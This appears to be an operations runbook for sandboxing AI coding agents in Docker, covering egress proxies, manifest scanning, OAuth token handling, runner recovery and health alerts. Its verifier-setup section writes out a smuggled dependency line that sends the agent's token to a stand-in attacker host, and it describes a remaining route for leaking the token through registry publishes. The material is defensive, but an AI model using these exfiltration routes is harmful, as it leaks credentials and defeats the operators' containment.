# Use the tags prod's .env names (LIFE_GRAPH_*_IMAGE), not the defaults below.
docker build --label life-graph.keep=true -t life-graph-sandbox-egress:dev -f Dockerfile.egress .   # the proxy
bash docker/claude-driver/build.sh                                       # life-graph-claude-driver:latest (adds the label)
docker build --label life-graph.keep=true -t life-graph-verifier:py3.12 docker/verifier              # verifier (and -node/-jvm if used)
# .env
LIFE_GRAPH_DRIVER_CLAUDE_SANDBOX=task
LIFE_GRAPH_VERIFIER_SANDBOX=docker
LIFE_GRAPH_DRIVER_CLAUDE_CODE_OAUTH_TOKEN=<from `claude setup-token`, see below>
```

Restart the API. Check it with `python scripts/runtime_security_probe.py --image
life-graph-claude-driver:latest`: it should report no host paths, no LIFE_GRAPH_* variables,
unreachable direct network, and 403 from the proxy for unlisted hosts. A missing image makes
dispatches fail with `exit_status=sandbox_unavailable`. They never fall back to the host.

### Test tools inside the driver container

The agent's shell can run the project's tests offline (Python projects):

- Before the agent runs, the driver gets the project's cached verifier environment. It is the
  same `sandbox.prepare_env` call, with the same registry `sandbox_setup`, that the verifiers
  use (usually a cache hit). On a bounce the manifests are those attempt 1 left, which is what
  the verifiers already build from. A first build adds wall time before the agent starts, but
  it does not count against the agent's time limit.
- The task runtime mounts that one directory **read-only** at `/venv`. The agent cannot change
  the environment the verifiers trust, and cannot see other projects' environments.
  `sandbox.readonly_bind_roots()` allows the verifier cache only read-only and never the cache
  root itself.
- The driver image carries the verifier's pinned `pytest`/`ruff`/`mypy`/`uv`; a unit test keeps
  the pins equal. Rebuild both images after a pin change.
- `PATH=/venv/bin:…`, `UV_NO_SYNC=1`, `UV_OFFLINE=1`, and the pytest/ruff/mypy cache settings
  keep tools on the mount and caches out of the worktree.
- **The egress allowlist is unchanged.** `pip install` still fails, by design.
- Each run's metadata has `tool_env` (`mounted read-only`, `off`, `not mounted: …` or
  `unavailable: …`). To turn it off, set `LIFE_GRAPH_DRIVER_RUNTIME_PROJECT_TOOLS=false`.
- Node and JVM projects are not covered yet.

### Verifier setup egress

The verifier sandbox's setup phase (`sandbox.prepare_env` / `prepare_node_env` /
`prepare_gradle_env`) installs dependencies from manifests the agent may have edited. Without a
fence, `x @ https://evil.example/?t=<token>` in `requirements.txt` sends the agent's token out
around the task runtime's allowlist. Two controls (`services/dev/setup_guard.py`):

1. **Egress proxy (enforcing).** Each setup gets its own `--internal` network with an isolated
   gateway (checked) and its own `life-graph-sandbox-egress` proxy, which relays only to the
   toolchain's registries on 443. DNS for outside names does not resolve, and direct
   connections have no route. The setup container has `HTTPS_PROXY` set (plus npm's
   `npm_config_*proxy` and Java's `-Dhttps.proxyHost` for Gradle). Network, proxy and
   container are removed after each setup. The startup and periodic sweep remove leftovers
   labelled `life-graph.runtime.task=verifier-setup` once they are older than the setup
   timeout plus 5 minutes.
2. **Manifest scan (fail fast).** Before the cache lookup, setup is refused if any of these
   names something other than a package from the registries: `requirements*.txt`,
   `constraints*.txt`, `requirements/*.txt` (and their `-r`/`-c` includes),
   `pyproject.toml` (and workspace members), `uv.toml`, `uv.lock`, `package.json`,
   `package-lock.json`, `npm-shrinkwrap.json`, the Gradle build files and
   `gradle-wrapper.properties`. Refused are direct URL, VCS, index or find-links overrides,
   `--trusted-host`/`allow-insecure-host`, lockfile entries resolved from another host, and
   local paths outside the worktree. Symlinked or unparseable manifests are refused too. A
   refusal makes the verifier **inconclusive** (never passed). The message names the file and
   host, never the query string.

Hosts, by setting (comma-separated):

```bash
LIFE_GRAPH_VERIFIER_SETUP_EGRESS_PYTHON=pypi.org,files.pythonhosted.org
LIFE_GRAPH_VERIFIER_SETUP_EGRESS_NODE=registry.npmjs.org
LIFE_GRAPH_VERIFIER_SETUP_EGRESS_JVM=services.gradle.org,downloads.gradle.org,downloads.gradle-dn.com,plugins.gradle.org,plugins-artifacts.gradle.org,repo.maven.apache.org,repo1.maven.org,dl.google.com,maven.google.com
```

A project that really needs another host (a private index, a git dependency, a postinstall
that downloads a binary) lists it in its registry setting `sandbox_setup_allow`: a list of
hostnames, plus `path` to allow local paths outside the worktree. Those hosts are then allowed
in the manifests **and** added to that project's setup proxy. An entry that is not a plain
hostname refuses setup. This is operator configuration, like `sandbox_setup`. The worktree
cannot change it.

```bash
curl -X PATCH .../kernel/projects/<id> -d '{"sandbox_setup_allow": ["pkgs.corp.example"]}'
```

Requirements: the egress image (`life-graph-sandbox-egress:dev`, or
`LIFE_GRAPH_DRIVER_RUNTIME_EGRESS_IMAGE`) and docker >= 28 are now needed whenever
`VERIFIER_SANDBOX=docker`. Without them, setup is unavailable and the checks that need it are
inconclusive. There is no fallback to an open network or to the host. Cached environments are
keyed as before. The scan runs before every cache lookup, so a cached env is never handed out
for manifests that are now refused.

What it does not close:

- **Registries that accept writes on the same hostname.** `registry.npmjs.org` takes
  `npm publish` and `plugins.gradle.org` takes plugin publishes. Code that runs during setup (an
  npm lifecycle script, a Gradle build script, a dependency's own install script) could publish
  a package that carries the token, using an account the attacker controls. PyPI uploads go to
  `upload.pypi.org`, which is not allowed. Closing this needs a read-only mirror or a
  pull-through cache (the proxy does not terminate TLS, so it cannot filter by method).
- **The scan is a fast first check, not a parser for every format.** For example, a host-run
  agent (OpenCode's `run_tests`) could rewrite a manifest between the scan and setup. The proxy
  is what holds then.
- The JVM path is covered by unit tests only. No JVM image was on the evidence machine.

### Claude login for sandboxed runs

A sandboxed `claude_code` run (`task` or `docker`) in OAuth mode uses a **long-lived token**:

```bash
claude setup-token        # in WSL, as the user the API runs as; opens the browser once
# put the printed token in .env (it is a secret; never commit it):
LIFE_GRAPH_DRIVER_CLAUDE_CODE_OAUTH_TOKEN=sk-ant-oat01-...
```

- The container gets it as `CLAUDE_CODE_OAUTH_TOKEN`, passed by name. Docker reads the value
  from its own environment, so it is never on a command line. The CLI's config dir is a
  throwaway `/tmp/.claude` in the container. Nothing from `~/.claude` is mounted.
- The token does not refresh, so nothing needs writing back.
- With no token, sandboxed dispatch refuses (`sandbox_unavailable`, message names `claude
  setup-token`). Each run's metadata records `login` (`oauth_token`, `api_key` or
  `staged_copy`).
- **Why not copy `~/.claude` in (the old way):** if the host's access token had expired, the
  CLI in the container refreshed it inside the throwaway copy. The refresh token rotated, and
  the host's own login was revoked ("OAuth session expired and could not be refreshed"; prod,
  2026-11-19). That copy is still there behind
  `LIFE_GRAPH_DRIVER_CLAUDE_CODE_ALLOW_STAGED_LOGIN=true`, for a login you don't otherwise use.
- The host login (`claude` → `/login`) is separate: host-mode runs and your own sessions use it.
- Rotate: `claude setup-token` again, replace the value, restart the API.

### Inspect and clean up

- Running runtimes: `docker ps --filter label=life-graph.runtime=1`. The task id is in the
  `life-graph.runtime.task` label, and the run's metadata is in `task.result.metadata.runtime`.
- Leftovers from a crash are removed at the next API start (`dev_task_runtime_sweep`
  startup step, runner-lock holder only). By hand:
  `docker rm -f $(docker ps -aq --filter label=life-graph.runtime=1)`, plus `docker network
  prune --filter label=life-graph.runtime=1`. Never remove the shared `lg-rt-outbound`
  network while a task is running.

### Runtime network addresses

Each runtime's internal network gets an explicit `/28` from
`LIFE_GRAPH_DRIVER_RUNTIME_SUBNET_POOL` (default `10.213.0.0/16`, prefix
`LIFE_GRAPH_DRIVER_RUNTIME_SUBNET_PREFIX=28`, so 4096 networks). Docker's default address
pools hold about 31 networks and the other stacks on this shared daemon use most of them: on
2026-11-19 the 12th concurrent runtime failed with "all predefined address pools have been
fully subnetted". The daemon config is not changed (that would restart every container).

- The subnet is derived from the runtime id. If another network holds it, docker says
  "Pool overlaps", and the runtime tries another one, 8 at most. After that the dispatch
  fails closed (`sandbox_unavailable`). It never falls back to docker's default pools or to
  the host. The rest of the network policy is unchanged: internal, isolated gateway, same
  labels, same proxy. The chosen subnet is in the run's metadata (`runtime.subnet`).
- The pool must be private IPv4 and must not overlap anything the host routes. On
  2026-11-19, `10.213.0.0/16` was clear of WSL (`172.17.192.0/20`, `10.255.255.254`), every
  docker network (`172.18-31/16`, `192.168.0-79/20`), Tailscale (`100.64.0.0/10`) and the
  Windows LAN (`10.78.60.0/24`). Check again with `ip route` and `ipconfig` after joining a
  new network (a VPN or another Wi-Fi), and move the pool if it now overlaps.
- An empty pool means docker picks from its default pools (the old behaviour).
- Evidence: `evals/reliability/20261119-runtime-pressure-subnet-pool.json` (23 runtimes, 20 at
  once, all started) and `docs/security/runtime-probe-20261119-subnet-pool.json` (isolation
  unchanged).

### Rollback

Set `LIFE_GRAPH_DRIVER_CLAUDE_SANDBOX=docker` (previous container behaviour) and restart.
There is no schema change.

### Dev-task runner (where tasks execute)

Every dev task goes through one runner (`services/dev/runner.py`). That runner sits in
whichever process holds the Postgres advisory lock `LGDV`. Other processes only write rows
and wake it: in-process directly, across processes with `NOTIFY lg_dev_tasks`, with a 60 s
poll as the fallback.

| `LIFE_GRAPH_DEV_TASK_RUNNER_MODE` | Who runs tasks | API restart |
|---|---|---|
| `api` (default) | the API process holding the lock | interrupts running tasks (recovered on start) |
| `worker` | `python -m life_graph.workers.dev_runner` | does **not** touch running tasks |

- **Starting the worker.** `start.sh` starts the worker when the mode is `worker`, and
  `stop.sh` stops it. A self-managed launcher such as `dev.sh` needs the same line:
  `"$VENV/bin/python" -m life_graph.workers.dev_runner`.
- **A second worker** waits for the lock as a hot standby. It never runs tasks alongside
  the first.
- **Limits:** `DEV_RUNNER_MAX_CONCURRENCY` (default 3) tasks at once, at most one of them
  unattended (nightly or queued work shares the GPU). "Start now" tasks are claimed first.
- **Lease:** `properties.lease` records the runner id, the claim time and a heartbeat,
  refreshed every 30 s.
- **Cancel:** `POST /api/v1/kernel/drivers/tasks/{id}/cancel`.
  - A queued task is cancelled at once.
  - For a running task, the runner kills the agent's process group or container
    (measured at 0.3 s) and records `cancelled`.
- **Stop or restart the worker:** SIGTERM drains running tasks for up to
  `DEV_RUNNER_DRAIN_SECONDS` (1500). Anything still running after that stays `running`
  and is recovered on the next start.
- **Recovery.** At start, recovery reads each task's checkpoint trail:
  - **Verified but not landed:** landed from the kept worktree without a second agent run,
    if the worktree's diff still matches the SHA-256 recorded when it was verified.
    Otherwise the task is re-run once.
  - **Landed, PR approval lost:** exactly one approval is filed.

### Live session and cancel (dashboard)

The run page (`/dev-tasks/:id`) shows a task's **live session**: runner lifecycle, dispatcher
stages, each step the agent takes as its CLI streams it, verifier verdicts, and runtime
start/teardown. It is read-only by design. Nobody types into the agent's container; Cancel
is the one control.

- **Storage:** `dev_task_events` (migration 060). Each event has a per-task `seq`, is
  redacted (`services/redaction.py`), is capped at 4,000 characters, and a task keeps at
  most 5,000 events. Events expire after `LIFE_GRAPH_DEV_TASK_EVENTS_RETENTION_DAYS` (14),
  at runner start.
- **Read:** `GET /api/v1/kernel/drivers/tasks/{id}/events?after=<seq>&wait=<s>` is a
  long-poll. It returns when something new arrives, when the task ends, or after `wait` (at
  most 25 s). `GET …/events/stream` is SSE (`text/event-stream`) for clients that can set
  headers, and resumes from `Last-Event-ID`. Both check the tenant.
- **Rate limit:** the API allows 60 requests per minute per tenant. The page batches the
  session poll (at least 3 s between calls while events flow), refreshes the task every
  10 s, and refetches recorded steps only when the status changes. Measured: an open run
  page never hit the limit, where the first version did.
- **Per-task time limit:** `timeout_seconds` on `POST /kernel/drivers/tasks`, capped by
  `LIFE_GRAPH_DEV_TASK_MAX_TIMEOUT_SECONDS` (3600).
- **Cancel:** the page's Cancel button takes two clicks.
  `POST /kernel/drivers/tasks/{id}/cancel` does the same.


### Dev-task runner unit (prod)

Prod runs dev tasks in a dedicated worker (`LIFE_GRAPH_DEV_TASK_RUNNER_MODE=worker`). The worker is the systemd user unit `~/.config/systemd/user/life-graph-dev-runner.service`. **It must be wanted by `life-graph.service`, not by `default.target`.** `life-graph.service` is `After=default.target`, so `WantedBy=default.target` together with `After=life-graph.service` forms an ordering loop at boot, and systemd silently drops the runner. See decision log D19, from 2026-11-21.

```ini
[Unit]
Description=Life Graph dev-task runner (prod edition)
After=life-graph.service
Wants=life-graph.service

[Service]
Type=simple
WorkingDirectory=/mnt/h/DevTools/Projects/life-graph-prod
ExecStart=/bin/bash -c 'set -a; . ./.env; set +a; export PYTHONPATH="$PWD"; exec /home/raja/.venvs/life-graph/bin/python -m life_graph.workers.dev_runner'
Restart=always
RestartSec=10
KillSignal=SIGTERM
TimeoutStopSec=1560
StandardOutput=append:/mnt/h/DevTools/Projects/life-graph-prod/logs/dev-runner.log
StandardError=append:/mnt/h/DevTools/Projects/life-graph-prod/logs/dev-runner.log

[Install]
WantedBy=life-graph.service
```

After changing the unit, run `systemctl --user daemon-reload && systemctl --user reenable life-graph-dev-runner`. Then check that `systemctl --user show life-graph.service -p Wants` lists the runner.

### Runtime health

`GET /api/v1/kernel/observability/system` has a `runtime` section: `status` (`ok`, `warning` or `critical`),
plus counts for the runner, tasks and containers, and the list of `issues`. It is install-wide,
so it carries counts and issue codes only, never task data
(`services/dev/runtime_health.py`). Every 10 minutes the **arq worker** checks it. That is a
different process from the dev-task worker, so a dead dev-task worker is still noticed. It
writes one owner notification per issue per 6-hour window (`source_type=runtime_health`), sent
to `LIFE_GRAPH_RUNTIME_HEALTH_ALERT_TENANTS` or, if that is empty, to the tenants who created
dev tasks in the last 30 days.

| Code | Severity | Meaning | First look |
|---|---|---|---|
| `runner_down` | critical | Nobody holds the runner lock | `systemctl --user status life-graph-dev-runner`, `logs/dev-runner.log` |
| `stale_leases` | critical | A running task stopped heartbeating | The runner recovers it after 180 s; if not, the worker is wedged: restart the unit |
| `queue_stuck` | warning | A start-now task has waited 30 min | Concurrency limit, or the WIP limits (`waiting` on the task) |
| `failures` | warning | 5 or more failed tasks in 24 h | `GET /kernel/drivers/failures` |
| `orphans` | warning | Containers or networks left by tasks that are not running, older than 5 min | The periodic sweep should remove them; see "Inspect and clean up" |
| `memory_pressure` | warning | An agent container is at 90% or more of its memory limit | `docker stats`; consider `DRIVER_CLAUDE_SANDBOX_MEMORY` |
| `docker_unavailable` | warning | Containers could not be listed while tasks use them | The docker daemon |
| `db_unavailable` | critical | The database check failed | Postgres |

### Benchmark and reliability checks

- **Benchmark:**
  `python scripts/bench_drivers.py --engine claude_code --engine local:ollama_chat/gpt-oss:20b --runtime task`
  Results go to `evals/driver_bench/` (see its README). It needs the driver and verifier
  images. Claude Code runs use the CLI's login.
- **Reliability:**
  `LIFE_GRAPH_DATABASE_URL=<a THROWAWAY database> python scripts/runtime_reliability.py --out evals/reliability/<date>.json`
  - It starts real worker processes and containers, with a fake CLI.
  - It refuses a database URL that doesn't look like a throwaway one.
  - It checks container kill, proxy kill, pickup, cancel, SIGTERM drain, SIGKILL recovery by a
    standby, no duplicate delivery, and concurrent tasks in separate worktrees.
- **Security probe:** `python scripts/runtime_security_probe.py --image <driver image>`.
- **Don't run any of these while a dev-task worker for the same install is starting.** A
  worker's startup sweep removes runtimes with no running task row. The scripts label their
  runtimes as a separate instance for this reason, but don't push it.
